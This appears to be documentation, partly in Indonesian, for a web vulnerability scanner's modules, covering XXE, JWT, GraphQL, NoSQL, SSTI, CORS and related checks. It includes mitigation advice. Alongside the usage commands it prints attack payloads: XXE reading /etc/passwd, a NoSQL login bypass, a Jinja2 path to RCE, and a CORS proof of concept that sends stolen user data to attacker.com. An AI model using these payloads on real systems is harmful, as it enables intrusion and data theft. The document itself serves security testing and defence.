# Advanced Modules Documentation

## 🔥 Modul-Modul Powerful Baru

### 1. XXE (XML External Entity) Injection

**Severity:** CRITICAL

**Deskripsi:** Mendeteksi kerentanan XXE yang memungkinkan attacker membaca file sistem, melakukan SSRF, atau DoS.

**Teknik:**
- Basic XXE dengan external entity
- Parameter entity injection
- Blind XXE dengan external DTD
- PHP wrapper untuk file reading

**Contoh Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

**Usage:**
```bash
python scanner.py "https://api.example.com/xml" --modules xxe
```

---

### 2. JWT Token Analysis

**Severity:** HIGH to CRITICAL

**Deskripsi:** Analisis keamanan JWT token untuk berbagai kerentanan.

**Checks:**
- Algorithm None attack
- Weak algorithms (HS256 vs RS256)
- Expired token acceptance
- Missing expiration claims
- Sensitive data in payload
- Algorithm confusion (RS256 → HS256)

**Usage:**
```bash
python scanner.py "https://api.example.com/auth" --modules jwt
```

**Manual Testing:**
```bash
# Decode JWT
echo "eyJhbGc..." | base64 -d

# Try algorithm none
# Change "alg": "HS256" to "alg": "none"
# Remove signature part
```

---

### 3. GraphQL Security Testing

**Severity:** MEDIUM to CRITICAL

**Deskripsi:** Test keamanan GraphQL API.

**Checks:**
- Introspection enabled (schema exposure)
- SQL injection via GraphQL queries
- NoSQL injection
- Batch query attacks (DoS)
- Recursive queries (DoS)
- GET method enabled (CSRF risk)

**Usage:**
```bash
python scanner.py "https://api.example.com/graphql" --modules graphql
```

**Introspection Query:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

---

### 4. NoSQL Injection

**Severity:** CRITICAL

**Deskripsi:** Deteksi NoSQL injection untuk MongoDB, CouchDB, Cassandra, dll.

**Teknik:**
- Operator injection ($ne, $gt, $regex)
- JavaScript injection ($where)
- Authentication bypass
- Time-based blind injection

**Contoh Payload:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

**Usage:**
```bash
python scanner.py "https://api.example.com/login" --modules nosql
```

---

### 5. SSTI (Server-Side Template Injection)

**Severity:** CRITICAL

**Deskripsi:** Deteksi SSTI pada berbagai template engines.

**Template Engines Supported:**
- Jinja2 (Python/Flask)
- Twig (PHP/Symfony)
- Freemarker (Java)
- Velocity (Java)
- Smarty (PHP)
- ERB (Ruby)
- Django (Python)
- Tornado (Python)

**Contoh Payload:**
```python
# Jinja2
{{7*7}}  # Returns 49
{{config.items()}}  # Config exposure
{{''.__class__.__mro__[1].__subclasses__()}}  # RCE
```

**Usage:**
```bash
python scanner.py "https://example.com?name=test" --modules ssti
```

---

### 6. CORS Misconfiguration

**Severity:** HIGH to CRITICAL

**Deskripsi:** Deteksi CORS policy yang salah konfigurasi.

**Checks:**
- Arbitrary origin reflection
- Wildcard with credentials
- Null origin allowed
- Subdomain wildcard
- Sensitive data exposure

**Usage:**
```bash
python scanner.py "https://api.example.com" --modules cors
```

**Exploitation:**
```html
<!-- PoC -->
<script>
fetch('https://api.example.com/user', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  // Send to attacker
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>
```

---

### 7. Clickjacking

**Severity:** MEDIUM to HIGH

**Deskripsi:** Test proteksi terhadap clickjacking attacks.

**Checks:**
- Missing X-Frame-Options
- Missing CSP frame-ancestors
- Weak ALLOW-FROM configuration
- JavaScript frame busting only

**Usage:**
```bash
python scanner.py "https://example.com/login" --modules clickjacking
```

**PoC Generation:**
```html
<iframe src="https://victim.com" style="opacity:0"></iframe>
<button style="position:absolute">Click for prize!</button>
```

---

### 8. Race Condition

**Severity:** CRITICAL

**Deskripsi:** Deteksi race condition vulnerabilities.

**Vulnerable Endpoints:**
- Coupon/voucher redemption
- Money transfer
- Purchase/checkout
- Resource allocation

**Teknik:**
- Concurrent requests (20+ simultaneous)
- TOCTOU (Time-of-Check Time-of-Use)
- Timing analysis

**Usage:**
```bash
python scanner.py "https://shop.example.com/redeem?code=ABC" --modules race
```

**Exploitation:**
```python
# Send 100 concurrent requests
import concurrent.futures
with ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(redeem_coupon) for _ in range(100)]
```

---

### 9. Mass Assignment

**Severity:** HIGH to CRITICAL

**Deskripsi:** Test mass assignment / parameter pollution.

**Vulnerable Parameters:**
- admin, is_admin, role
- price, amount, balance
- user_id, account_id
- verified, active, enabled

**Contoh Attack:**
```bash
# Normal request
POST /api/user/update
{"name": "John", "email": "john@example.com"}

# Mass assignment
POST /api/user/update
{"name": "John", "email": "john@example.com", "is_admin": true, "role": "admin"}
```

**Usage:**
```bash
python scanner.py "https://api.example.com/user" --modules mass-assign
```

---

### 10. WebSocket Security

**Severity:** HIGH to CRITICAL

**Deskripsi:** Test keamanan WebSocket connections.

**Checks:**
- Unauthenticated connections
- CORS misconfiguration (Origin header)
- Message injection (XSS, SQLi, Command)
- Sensitive data exposure

**Usage:**
```bash
python scanner.py "https://example.com/ws" --modules websocket
```

**Manual Testing:**
```javascript
// Connect
const ws = new WebSocket('wss://example.com/ws');

// Send malicious payload
ws.send('{"cmd":"ls"}');
ws.send('{"role":"admin"}');
```

---

## 🎯 Preset Combinations

### API Security Audit
```bash
python scanner.py "https://api.example.com" --modules api
# Includes: jwt, graphql, cors, mass-assign, race, nosql, websocket
```

### Injection Testing
```bash
python scanner.py "https://example.com?id=1" --modules injection
# Includes: sqli, blind-sqli, nosql, xss, stored-xss, lfi, cmd, xxe, ssti
```

### Full Web Application Audit
```bash
python scanner.py "https://example.com" --modules web
# Includes: All web vulnerabilities + CORS + Clickjacking + Mass Assignment
```

---

## 🛡️ Mitigation Recommendations

### XXE Prevention
```xml
<!-- Disable external entities -->
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

### JWT Security
```python
# Use RS256 instead of HS256
# Always verify signature
# Set short expiration times
# Don't store sensitive data in payload
```

### GraphQL Security
```javascript
// Disable introspection in production
const schema = makeExecutableSchema({
  typeDefs,
  resolvers,
  introspection: false
});

// Implement query depth limiting
// Implement query complexity analysis
```

### NoSQL Injection Prevention
```javascript
// Use parameterized queries
// Validate input types
db.collection.find({ username: String(username) });

// Disable $where operator
```

### SSTI Prevention
```python
# Use sandboxed environments
# Disable dangerous functions
# Validate user input
# Use safe template rendering
```

### CORS Security
```javascript
// Whitelist specific origins
const allowedOrigins = ['https://trusted.com'];
if (allowedOrigins.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}

// Never use wildcard with credentials
```

### Race Condition Prevention
```python
# Use database transactions
# Implement proper locking
# Use atomic operations
with transaction.atomic():
    # Critical section
    pass
```

### Mass Assignment Prevention
```python
# Whitelist allowed fields
allowed_fields = ['name', 'email']
update_data = {k: v for k, v in data.items() if k in allowed_fields}

# Use strong typing
# Implement field-level permissions
```

---

## 📚 References

- OWASP Top 10
- OWASP API Security Top 10
- PortSwigger Web Security Academy
- HackerOne Disclosed Reports
- Bug Bounty Writeups
